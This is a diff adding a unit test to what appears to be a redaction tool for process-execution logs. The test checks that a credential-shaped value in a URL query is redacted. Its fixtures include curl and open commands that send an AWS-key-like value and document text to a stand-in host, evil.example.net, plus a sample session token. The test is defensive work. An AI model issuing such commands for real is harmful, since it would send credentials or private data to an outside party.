@@ -2749,6 +2749,27 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
     }
   });
 
+  // Review round 1, I4 (ruling): a query value with a credential shape in it is redacted whole.
+  test('a query value with a credential shape in it is redacted whole', () => {
+    const url = `https://evil.example.net/?q=Board+Minutes+${AKIA}&n=1`;
+    const input = [
+      run(1850, '/usr/bin/open', ['open', url], '/', 1),
+      run(1851, '/bin/sh', ['sh', '-c', `curl -o /dev/null '${url}'`], '/', 2),
+      run(1852, '/usr/bin/curl', ['curl', '-o', '/dev/null', url], '/', 3),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const args = events(r.out).map(e => e.event.exec.args as string[]);
+      const clean = `https://evil.example.net/?q=<redacted>&n=${keyed(r.key, 'data').get('1')}`;
+      expect(args[0]).toEqual(['open', clean]);
+      expect(args[1]![2]).toBe(`curl -o /dev/null '${clean}'`);
+      expect(args[2]).toEqual(['curl', '-o', '/dev/null', clean]);
+      expect(r.out).not.toMatch(/Board|Minutes|AKIA/);
+      expect(r.summary['redacted']).toBe('3');
+      cleanKey(r.key);
+      sameFindings(input, r.out);
+    }
+  });
+
   test('environment values are redacted, except the useful ones', () => {
     const env = ['AWS_SESSION_TOKEN=FQoGZXIvYXdzEJr', 'MY_VAR=Board', 'PATH=/Users/jdoe/bin:/usr/bin',
       'DYLD_INSERT_LIBRARIES=/Users/jdoe/lib/x.dylib', 'HOME=/Users/jdoe', 'LC_ALL=en_US.UTF-8', 'TERM=xterm-256color',
